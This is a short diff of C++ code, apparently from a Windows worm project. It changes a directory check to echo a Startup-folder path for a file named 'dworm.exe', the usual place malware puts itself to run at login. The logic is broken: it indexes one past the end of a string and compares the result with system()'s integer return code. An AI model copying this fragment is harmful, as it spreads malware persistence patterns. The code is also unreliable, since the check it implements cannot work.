@@ -136,7 +136,7 @@ int main(int argc, char* argv[]) {
 		cout << dir << endl;
 		system("pause");
 
-		if (dir[dir.size()] == system("echo %cd%")) {
+		if (dir[dir.size()] == system("echo C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dworm.exe")) {
 			Sleep(1000);
 			string ftext = "c4";
 			MessageBoxA(NULL, ftext.c_str(), "c4", MB_OK);
